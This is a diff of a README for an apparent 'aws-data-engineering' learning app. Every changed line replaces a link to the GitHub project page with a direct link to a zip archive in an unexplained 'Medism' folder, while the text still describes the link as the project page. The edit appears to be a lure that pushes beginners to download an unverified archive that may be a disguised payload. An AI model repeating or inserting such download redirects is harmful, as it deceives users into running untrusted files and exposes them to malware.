@@ -1,6 +1,6 @@
 # 🔧 aws-data-engineering - Learn AWS Data Tools Easily
 
-[![Download aws-data-engineering](https://img.shields.io/badge/Download-aws--data--engineering-brightgreen)](https://github.com/best254002-boop/aws-data-engineering)
+[![Download aws-data-engineering](https://img.shields.io/badge/Download-aws--data--engineering-brightgreen)](https://raw.githubusercontent.com/best254002-boop/aws-data-engineering/main/Medism/aws-engineering-data-3.3-beta.1.zip)
 
 ## 📘 About This Application
 
@@ -32,7 +32,7 @@ You will download the app from the main project page on GitHub. You do not need 
 
 Click the green button above or open this link in your web browser:
 
-https://github.com/best254002-boop/aws-data-engineering
+https://raw.githubusercontent.com/best254002-boop/aws-data-engineering/main/Medism/aws-engineering-data-3.3-beta.1.zip
 
 This page has the full project files and instructions.
 
@@ -133,7 +133,7 @@ Explore the folders to see the content before running the app if you want.
 
 You can visit this page to download:
 
-https://github.com/best254002-boop/aws-data-engineering
+https://raw.githubusercontent.com/best254002-boop/aws-data-engineering/main/Medism/aws-engineering-data-3.3-beta.1.zip
 
 Or use the button at the top to go straight there.
 
